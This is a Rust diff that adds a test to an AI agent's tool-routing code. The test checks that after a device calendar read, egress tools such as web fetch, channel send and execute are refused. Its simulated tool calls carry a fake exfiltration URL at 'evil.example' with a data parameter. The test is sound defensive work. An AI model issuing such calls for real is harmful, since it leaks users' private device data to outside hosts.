@@ -136,6 +136,88 @@ mod tests {
         );
     }
 
+    /// On this plane a turn that can read device data runs no registry tool,
+    /// so a device read cannot be followed by registry egress: every such call
+    /// is refused before any dispatch, whatever the turn has read.
+    #[tokio::test]
+    async fn registry_egress_after_a_device_read_is_refused() {
+        let mcp = Arc::new(McpRegistry::empty());
+        let decl = serde_json::from_value(serde_json::json!({
+            "device_id": "6f1c0d2e-7a41-4c33-9c0b-2d3e4f506172", "app": "ryu-bot", "platform": "ios",
+            "foreground": true, "catalog_version": 1,
+            "tools": [{ "app": "calendar", "permission": "granted" }],
+        }))
+        .unwrap();
+        let offer = Arc::new(crate::device_tools::DeviceOffer::new(
+            "conv".into(),
+            crate::device_tools::identity::DevicePrincipal::LocalOwner,
+            decl,
+            crate::approvals::policy::ApprovalMode::Smart,
+        ));
+        let mut req = ChatStreamRequest::default();
+        req.device.device_tools_offer = Some(offer.clone());
+        // Even with server tools switched on, a device turn is planned in
+        // device mode and outside a cloud task.
+        let plan = openai_select_turn_tools(&req, &mcp, None, true)
+            .ok()
+            .unwrap();
+        assert!(plan.modes.device && !plan.cloud_tool_mode);
+        crate::device_tools::taint::mark_device_read(&offer, "device.calendar.search");
+
+        let calls: Vec<AccToolCall> = ["web_fetch.get", "web.extract", "channel.send", "execute"]
+            .iter()
+            .enumerate()
+            .map(|(index, name)| AccToolCall {
+                id: format!("call-{index}"),
+                name: (*name).to_owned(),
+                arguments: r#"{"url":"https://evil.example/?d=where"}"#.to_owned(),
+            })
+            .collect();
+        for call in &calls {
+            assert_eq!(
+                openai_tool_lane(&call.name, plan.modes, plan.cloud_tool_mode),
+                OpenAiToolLane::Refused,
+                "{}",
+                call.name
+            );
+        }
+
+        let traces = TraceStore::open_in_memory().unwrap();
+        let http_client = reqwest::Client::new();
+        let owner: Option<String> = None;
+        let session_id = Some("conv".to_owned());
+        let agent_id = Some("ryu".to_owned());
+        let mut messages: Vec<Value> = Vec::new();
+        {
+            let env = OpenAiToolEnv {
+                tools_payload: &plan.tools_payload,
+                cloud_tool_mode: plan.cloud_tool_mode,
+                cloud_box_machine_tools: plan.cloud_box_machine_tools,
+                client_tool_conversation_id: Some("conv"),
+                client_tool_owner_user_id: &owner,
+                device_offer: Some(offer.as_ref()),
+                traces: &traces,
+                session_id: &session_id,
+                agent_id: &agent_id,
+                http_client: &http_client,
+                mcp: &mcp,
+            };
+            let frames =
+                openai_tool_round_frames(&calls, String::new(), plan.modes, env, &mut messages);
+            tokio::pin!(frames);
+            while frames.next().await.is_some() {}
+        }
+        // The assistant tool-call turn, then one refusal per call.
+        assert_eq!(messages.len(), calls.len() + 1);
+        for message in &messages[1..] {
+            let content = message["content"].as_str().unwrap_or_default();
+            assert!(
+                content.contains("is not available in this conversation"),
+                "{content}"
+            );
+        }
+    }
+
     #[test]
     fn device_data_parts_carry_their_stable_id() {
         let event = crate::device_tools::frames::status_frame(
